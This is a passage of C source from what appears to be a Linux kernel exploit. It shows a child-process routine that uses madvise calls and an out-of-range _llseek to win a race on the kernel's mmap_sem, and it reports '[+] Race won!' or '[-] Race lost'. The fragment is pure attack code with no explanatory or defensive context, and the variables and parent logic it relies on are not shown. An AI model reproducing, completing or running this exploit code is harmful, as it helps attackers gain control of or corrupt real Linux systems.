//	child close sempahore & sleep
int start_child(void *arg)
{
//	unlock parent & close semaphore
	go[0]=0;
	madvise(file, csize, MADV_DONTNEED);
	madvise(file, csize, MADV_SEQUENTIAL);
	gettimeofday(&tv1, NULL);
	read(pfd, buf, 0);

	go[0]=1;
	r = madvise(file, csize, MADV_WILLNEED);
	if(r)
		fatal("madvise");

//	parent blocked on mmap_sem? GOOD!
	if(go[1] == 1 || _llseek(pfd, 0, 0, &off, SEEK_CUR)<0 ) {
		r = _llseek(pfd, 0x7fffffff, 0xffffffff, &off, SEEK_SET);
			if( r == -1 )
				fatal("lseek");
		printf("\n[+] Race won!"); fflush(stdout);
		go[0]=2;
	} else {
		printf("\n[-] Race lost %d, use another file!\n", go[1]);
		fflush(stdout);
		kill(getppid(), SIGTERM);
	}
	_exit(1);

return 0;
}